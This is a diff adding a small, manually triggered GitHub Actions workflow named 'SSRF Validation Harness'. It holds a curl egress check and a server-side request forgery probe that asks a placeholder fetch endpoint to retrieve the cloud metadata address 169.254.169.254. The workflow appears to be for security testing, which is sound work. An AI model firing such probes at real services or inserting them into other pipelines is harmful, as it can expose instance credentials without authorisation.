@@ -1,0 +1,16 @@
+name: SSRF Validation Harness
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Egress check
+      run: curl -s https://example.com
+
+    - name: SSRF test
+      run: |
+        curl -s "https://your-sink/fetch?url=http://169.254.169.254" | jq .
